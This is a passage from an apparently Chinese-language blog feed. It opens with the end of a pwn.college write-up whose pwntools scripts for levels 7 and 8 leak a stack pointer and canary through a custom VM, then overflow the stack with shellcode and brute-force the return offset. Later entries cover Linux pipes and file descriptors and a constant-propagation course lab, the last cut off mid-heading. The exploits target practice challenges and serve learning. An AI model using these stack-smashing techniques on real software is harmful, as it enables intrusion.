class="hljs-number">7</span>],<br><br>    <span class="hljs-string">&#x27;REG_A&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;REG_B&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;REG_C&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;REG_D&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;REG_I&#x27;</span>: ID[<span class="hljs-number">2</span>],<br><br>    <span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>: ID[<span class="hljs-number">5</span>],<br>    <span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>: ID[<span class="hljs-number">4</span>]<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ins</span>(<span class="hljs-params">op, arg1, arg2</span>):<br>    <span class="hljs-keyword">return</span> arg2 + arg1 + op<br><br>vm_code = <span class="hljs-string">b&#x27;&#x27;</span><br>offset= <span class="hljs-number">0x100</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 这里通过在栈上观察情况，write出old_rsp，然后read读取payload到内存的某个位置，通过不断爆破得到offset来使ret到payload的位置</span><br>    r = process(binary_paths)<br>    <span class="hljs-comment"># a = write(1, 0xff, 0x68)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c]</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\x68&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#对应的是rsp+0x3d8的位置，也就是这里ins[]数值自动加0x10</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    <span class="hljs-comment"># a = read(0, 0xff, 0xff)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c] -&gt; read_memory</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\xff&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#这里也是+0x10，对应rsp+0x408</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    r.send(vm_code)<br>    r.recvuntil(<span class="hljs-string">b&#x27;write\n&#x27;</span>)<br>    <span class="hljs-comment"># 最后获取到的就是old_rsp，详细看level 8的解释</span><br>    ret = r.recv(<span class="hljs-number">0x68</span>)<br>    old_rsp = ret[-<span class="hljs-number">8</span>:]<br>    success(<span class="hljs-string">f&quot;Old RBP: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(u64(old_rsp))&#125;</span>&quot;</span>)<br>    shellcode = asm(shellcode_origin, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    <span class="hljs-comment"># 根据堆栈计算出payload的偏移，然后构造ret</span><br>    payload = shellcode + (<span class="hljs-number">0x50</span> - <span class="hljs-built_in">len</span>(shellcode)) * p8(<span class="hljs-number">0xff</span>) + p64(u64(old_rsp) - offset)<br>    r.send(payload)<br>    text = r.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> text:<br>        offset += <span class="hljs-number">8</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Offset:&quot;</span>, offset)<br>        r.close()<br>    <span class="hljs-keyword">else</span>:<br>        success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="level-8-3"><a class="markdownIt-Anchor" href="#level-8-3"></a> level 8</h2><blockquote><p>与level 7相比只是多了一个cannary</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># shellcode，就是open f 和 sys_sendfile</span><br>shellcode_origin = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov al, 2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rsi, rax</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    mov rcx, 0x1000</span><br><span class="hljs-string">    mov ax, 40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 根据vm的规则设定相应的vm_op(只把用上的给改了，其余没用的就没改)，然后通过get_ins直接获取相应的二进制数</span><br>ID = [<span class="hljs-string">b&#x27;\x01&#x27;</span>, <span class="hljs-string">b&#x27;\x02&#x27;</span>, <span class="hljs-string">b&#x27;\x04&#x27;</span>, <span class="hljs-string">b&#x27;\x08&#x27;</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>, <span class="hljs-string">b&#x27;\x20&#x27;</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>, <span class="hljs-string">b&#x27;\x80&#x27;</span>]<br>vm_op = &#123;<br>    <span class="hljs-string">&#x27;IMM&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;ADD&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;STK&#x27;</span>: ID[<span class="hljs-number">7</span>],<br>    <span class="hljs-string">&#x27;STM&#x27;</span>: ID[<span class="hljs-number">2</span>],<br>    <span class="hljs-string">&#x27;LDM&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;CMP&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;JMP&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;SYS&#x27;</span>: ID[<span class="hljs-number">0</span>],<br><br>    <span class="hljs-string">&#x27;REG_A&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;REG_B&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;REG_C&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;REG_D&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;REG_I&#x27;</span>: ID[<span class="hljs-number">3</span>],<br><br>    <span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>: ID[<span class="hljs-number">3</span>],<br>    <span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>: ID[<span class="hljs-number">1</span>]<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ins</span>(<span class="hljs-params">op, arg1, arg2</span>):<br>    <span class="hljs-keyword">return</span> op + arg2 + arg1<br><br>vm_code = <span class="hljs-string">b&#x27;&#x27;</span><br>offset= <span class="hljs-number">0x100</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 这里通过在栈上观察情况，write出old_rbp，然后read读取payload到内存的某个位置，通过不断爆破得到offset来使ret到payload的位置</span><br>    r = process(binary_paths)<br>    <span class="hljs-comment"># r = gdb.debug(binary_paths[0], &quot;break *0x401D82&quot;)</span><br>    <span class="hljs-comment"># a = write(1, 0xff, 0x68)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c]</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\x68&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#对应的是rsp+0x3d8的位置，也就是这里ins[]数值自动加0x10</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    <span class="hljs-comment"># a = read(0, reg_b, 0xff)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c] -&gt; read_memory</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\xff&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#这里也是+0x10，对应rsp+0x3d8</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    r.send(vm_code)<br>    r.recvuntil(<span class="hljs-string">b&#x27;write\n&#x27;</span>)<br>    <span class="hljs-comment"># 最后获取到的就是old_rsp,这里main存在push rbp和sub rsp,0x420的操作，所以这里的esp+0x428应该是压入的rbp的值，而不是ret</span><br>    <span class="hljs-comment"># 而调用main的start在调用之前进行了push rsp操作，所以栈从高到低为rsp, ret, rbp, 脏数据,cannary。所以显示表格的ret其实是rbp的值。</span><br>    <span class="hljs-comment"># 所以这里构造的0x68最后接收的就是start push的rsp的值，它离main的rbp更近，可以更快得到输入数据的地址</span><br>    ret = r.recv(<span class="hljs-number">0x68</span>)<br>    success(<span class="hljs-string">f&quot;ret: <span class="hljs-subst">&#123;ret&#125;</span>&quot;</span>)<br>    old_rsp = ret[-<span class="hljs-number">8</span>:]<br>    <span class="hljs-comment"># cannary距离old_rsp相差4*0x8距离</span><br>    cannary = ret[-<span class="hljs-number">40</span>:-<span class="hljs-number">32</span>]<br>    success(<span class="hljs-string">f&quot;Old RSP: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(u64(old_rsp))&#125;</span>&quot;</span>)<br>    success(<span class="hljs-string">f&quot;cannary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(u64(cannary))&#125;</span>&quot;</span>)<br>    shellcode = asm(shellcode_origin, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shellcode)]<br>    success(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>    payload = shellcode + (<span class="hljs-number">0x40</span> - <span class="hljs-built_in">len</span>(shellcode)) * p8(<span class="hljs-number">0xff</span>) + p64(u64(cannary)) + p64(<span class="hljs-number">0</span>) + p64(u64(old_rsp) - offset)<br>    r.send(payload)<br>    text = r.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> text:<br>        offset += <span class="hljs-number">8</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Offset:&quot;</span>, offset)<br>        r.close()<br>    <span class="hljs-keyword">else</span>:<br>        success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="others"><a class="markdownIt-Anchor" href="#others"></a> Others</h1><h2 id="tips"><a class="markdownIt-Anchor" href="#tips"></a> tips</h2><ul><li>linux中的history，可以快速进行命令(方便与gcc那一长串)<ul><li>主要使用 <code>history | grep gcc</code> 来查找之前的命令</li><li>也可以使用 <code>ctrl + R</code>，然后开始匹配历史命令，不用输入一长串了</li></ul></li><li>在/opt中存在pwndbg还有一些其他东西，不需要用自己的机器调试了</li></ul><blockquote><p><a href="https://j-shiro.github.io/">参考wp1</a> <a href="https://www.freebuf.com/author/thundersword">参考wp2</a> <a href="https://dem0dem0.top/2023/12/06/shellcode_injection/">参考wp3</a> <a href="https://www.buryia.top/page/2/#content-inner">参考wp4</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux管道机制</title>
    <link href="/posts/12101e44.html"/>
    <url>/posts/12101e44.html</url>
    
    <content type="html"><![CDATA[<h1 id="文件描述符"><a class="markdownIt-Anchor" href="#文件描述符"></a> 文件描述符</h1><blockquote><p><a href="https://blog.csdn.net/yushuaigee/article/details/107883964">彻底弄懂 Linux 下的文件描述符(fd)</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo log &gt; /dev/null 2&gt;&amp;1<br></code></pre></td></tr></table></figure><ul><li><code>&gt;</code> 表示数据的重定向，可以理解为数据的传递<ul><li><code> echo '123' &gt; a.txt</code> 就是将123写入a.txt文件</li><li><code> cat &lt; a.txt</code> 将a.txt文件中的内容写入cat，这里因为cat可以接收数据在终端显示(文件描述符1)，所以它会显示a.txt的文件内容到终端</li><li>这里 <code>&gt;</code> 与 <code>&lt;</code> 默认都是对于标准输入和标准输出的处理，对于其他文件描述符而言，需要在前面加上对应的文件描述符才可以(补充，文件描述符都是对于一个进程而言的，所以对其操作需要一个进程来完成)</li></ul></li><li><code>/dev/null</code> 表示空设备文件<ul><li>所以这里的 <code>echo log &gt; /dev/null</code> 表示把日志输出到空文件设备，也就是将打印信息丢弃掉，屏幕上什么也不显示</li></ul></li><li>文件描述符 <code>0</code> 表示 stdin 标准输入，<code>1</code> 表示 stdout 标准输出， <code>2</code> 表示 stderr 标准错误输出<ul><li>文件描述符就是内核为了高效管理这些已经被打开的文件所创建的索引，它是一个非负整数(通常是小整数)，用于指代被打开的文件，所有执行 I/O操作 的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，<code>0是标准输入，1是标准输出，2是标准错误</code>。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4……这里可以将文件描述符视为全局文件，对它进行操作就是对于文件的读与写</li></ul></li><li><code>&amp;</code> 表示拷贝操作，这里 <code>2&gt;&amp;1</code> 就是说将执行文件描述符2的指针执行文件描述符1，就是将2输出的内容从1中输出，相当于两个不相关的管道进行了合流<ul><li>在这个例子中，1首先重定向了空设备文件，然后2再重定向到1中，表示2的输出也被丢弃了</li><li>对于 <code>command &gt; file 2&gt;&amp;1</code>，这里将标准输出重定向到file中，2&gt;&amp;1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中</li><li>对于 <code>command 2&gt;&amp;1 &gt; file</code>，这里标准错误拷贝了标准输出的行为，但此时标准输出还是在终端，所以标准错误输出拷贝了目前标准输出的内容输出到终端的状态，&gt;file 后标准输出才被重定向到file，但标准错误仍然保持原来的拷贝状态，将内容从标准输出到终端</li></ul></li></ul><h1 id="管道"><a class="markdownIt-Anchor" href="#管道"></a> 管道</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/58489873">Linux 的进程间通信：管道 - 知乎 (zhihu.com)</a></p></blockquote><p>​简单而言，管道就是应对系统在执行命令的时候，将一个程序的输出传递给另一个程序而产生的，以往可以使用输入输出重定向的方式和文件进行解决，但是相对而言比较麻烦，所以催生出了匿名管道和命名管道</p><h2 id="进程间通信ipc"><a class="markdownIt-Anchor" href="#进程间通信ipc"></a> 进程间通信(IPC)</h2><p>​每个进程有各自不同的用户地址空间，任何一个进程的全局变量在另一个进程中都看不到。所以进程之间要交换数据必须通过内核，在内核中开辟一块缓冲区，进程1把数据从用户空间中拷贝到缓冲区，进程2再从缓冲区把数据读走。内核提供的这种机制就是进程间通信。</p><p>​通信需要媒介，两个进程间通信的媒介就是内存。通信的原理就是让两个或多个进程能够看到同一块共同的资源，这块资源一般都是由内存提供。</p><h2 id="管道符"><a class="markdownIt-Anchor" href="#管道符"></a> 管道符</h2><p>​管道符主要用于多重命令处理，前面命令的打印结果作为后面命令的输入。管道符也是一种匿名管道。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这个就是将前面的输入当作后面的输入</span><br>ps -aux | grep bash<br></code></pre></td></tr></table></figure><h2 id="匿名管道pipe"><a class="markdownIt-Anchor" href="#匿名管道pipe"></a> 匿名管道(PIPE)</h2><p>​匿名管道最常见的形态就是我们在shell操作中最常用的 ”<code>|</code>”。它的特点是只能在父子进程中使用，父进程在产生子进程前必须打开一个管道文件，然后fork产生子进程，这样子进程通过拷贝父进程的进程地址空间获得同一个管道文件的描述符，以达到使用同一个管道通信的目的。此时除了父子进程外，没人知道这个管道文件的描述符，所以通过这个管道中的信息无法传递给其他进程。</p><p>​**通过父子进程继承关系，再将文件描述符关闭，实现一端写，一端读，就是匿名管道。**它通常使用系统调用 pipe 来进行创建。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(pipefd[<span class="hljs-number">2</span>])</span></span>;<br></code></pre></td></tr></table></figure><p>参数：(输出型参数，通过参数找到打开的2个fd)文件描述符数组，其中pipefd[0]表示读端，pipefd[1]表示写端</p><p>返回值：成功返回0，失败返回错误码。</p><h2 id="命名管道fifo"><a class="markdownIt-Anchor" href="#命名管道fifo"></a> 命名管道(FIFO)</h2><p>​命名管道在底层的实现跟匿名管道完全一致，区别只是命名管道会有一个全局可见的文件名以供别人open打开使用。载程序中创建一个命名管道文件的方法有两种，一种是使用mkfifo函数。另一种是使用mknod系统调用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">root:~/re$ mkfifo t1<br>root:~/re$ ls -al<br>total 24<br>drwxr-xr-x  3 tcz tcz  4096 Jan 31 17:02 .<br>drwxr-x--- 20 tcz tcz  4096 Jan 31 13:25 ..<br>-rw-------  1 tcz tcz 12288 Jan 31 13:25 .swp<br>prw-r--r--  1 tcz tcz     0 Jan 31 17:02 t1 # 这里就是创建了一个命名管道，它使用p来标识<br>drwxr-xr-x  3 tcz tcz  4096 Jan 18 10:59 tools<br></code></pre></td></tr></table></figure><p>​对于创建的命名管道，它也是半双工的，如果只对管道t1进行写操作，那么该操作将会阻塞，只有再对t1进行读操作之后，写操作才会停止，然后读操作读出写入的内容。同时反过来也相同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">root:~/re$ cat &lt; t1 # 只是读取管道，没有写操作，进程将会阻塞<br>^C<br>root:~/re$ cat &lt; t1 &amp; # 后台执行读操作<br>[1] 571<br>root:~/re$ echo &#x27;a&#x27; &gt; t1 # 之后进行写操作<br>root:~/re$ a # 然后会打印出写入t1的数据<br></code></pre></td></tr></table></figure><p>​如果需要制造一个可交互的双通道，则需要两个命令管道进行处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">shell脚本</span><br>/challenge/embryoio_level* &lt; t1 &gt; t2 &amp;<br>cat &lt; t2 &amp;<br>cat &gt; t1<br></code></pre></td></tr></table></figure><p>​拿pwn.college中Program Interaction的 level 93进行举例。这里需要先创建两个fifo管道t1，t2，然后 <code>&amp;</code> 是后台运行。通过 <code>cat &lt; t2 &amp; cat &gt; t1</code> 创建了一个可交互的双通道，challenge的输出给了t2，再由 cat &lt; t2 显示到终端，然后终端通过 cat &gt; t1 输入数据到终端，数据给了t1，再由t1给challenge</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root:~/re$ <span class="hljs-built_in">mkfifo</span> t1<br>root:~/re$ <span class="hljs-built_in">mkfifo</span> t2<br>root:~/re$ bash b.sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>OS相关</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab2</title>
    <link href="/posts/88c3bf7c.html"/>
    <url>/posts/88c3bf7c.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab2"><a class="markdownIt-Anchor" href="#lab2"></a> Lab2</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><ul><li>这次搞明白代码的实现逻辑，同时跟着指南进行就很清晰地实现代码部分</li><li>在这里 <code>ConstantPropagation</code> 实现的就是数据流的处理, 例如 <code>meetinto</code>, <code>Transfer Function</code>; 而 <code>Solver</code> 和 <code>WorkListSolver</code> 就是实现迭代算法的具体流程。这两个就相当于前面的是函数实现，后面就是利用函数来实现一个流程<ul><li>这里需要注意, <code>meetinto</code> 处理的就是 两个 BB 之间数据的流动交汇情况, 这里指对于多个分支对同一个变量的赋值交汇在同一点的处理; 而 <code>TransferNode</code> 则是对于 BB 内部数据的处理，可以近似看作对于 Statement 的处理。</li></ul></li></ul><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><blockquote><p>实现常量传播算法和一个通用的 worklist 求解器</p></blockquote><p>​主要就是一个针对int类型的常量传播(Java 中，<code>boolean</code>、<code>byte</code>、<code>char</code> 和 <code>short</code> 类型在运行时实际上都以 <code>int</code> 值的形式进行表示和计算)，同时改进迭代过程的算法。</p><h2 id="常量传播"><a class="markdownIt-Anchor" href="#常量传播"></a> 常量传播</h2><p>​常量传播指如果我们知道了某些程序点处的某些变量一定是一个常量的话，我们就可以直接优化，将这个变量视为常量，从而减少内存的消耗。这里的语句处理主要关注等号左侧为变量且右侧只能是如下几类表达式的赋值语句</p><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> Exp</h3><ul><li><code>pascal.taie.ir.exp.Exp</code><ul><li>表达式类，这里需要处理表达式的各种子类。它们都是表达式的右侧表示，需要在 <code>evaluate</code> 的方法中对这三个子类进行处理。<code>Var</code> 是变量，<code>IntLiteral</code> 是常量，<code>BinaryExp</code> 是二元表达式，他有不同的表达形式。</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402282307310.png" alt="image-20240228230755226" /></li></ul></li></ul><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.dataflow.analysis.constprop.CPFact</code><ul><li>表示常量传播中的 data facts，即一个从变量(<code>Var</code>)到格上抽象值(<code>Value</code>)的映射。这里可以和 Lab1 进行比对，Lab1 是用 <code>SetFact&lt;Var&gt;</code> 类型来表示每个变量的使用情况，动调发现它应该是将赋值为1的变量名称加入这个set中的，里面存储的就是活跃变量的名称。而这里实现的是 <code>MapFact&lt;Var, Value&gt;</code>，所以它存储着变量与value这样一个键值对。之所以这样搞，是因为它不再是简单的0/1的状态了，而是存在<strong>多个状态</strong>(具体看下面的value的代表数值)，所以需要键值对来满足条件。</li></ul></li><li><code>pascal.taie.analysis.dataflow.analysis.constprop.Value</code><ul><li>这个类表示了常量分析中格上的抽象值。下面的静态方法获取格上的抽象值</li><li><code>Value getNAC()</code>: 返回 <code>NAC</code></li><li><code>Value getUndef()</code>: 返回 <code>UNDEF</code></li><li><code>Value makeConstant(int)</code>: 返回给定整数在格上对应的抽象值</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" 